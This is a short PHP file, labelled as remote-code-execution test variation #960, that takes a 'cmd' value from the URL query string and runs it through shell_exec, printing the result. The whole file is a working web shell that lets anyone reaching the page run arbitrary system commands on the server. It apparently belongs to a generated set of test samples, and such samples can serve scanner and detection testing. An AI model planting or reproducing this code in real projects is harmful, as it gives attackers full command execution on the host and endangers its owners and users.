<?php
// RCE test variation #960
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>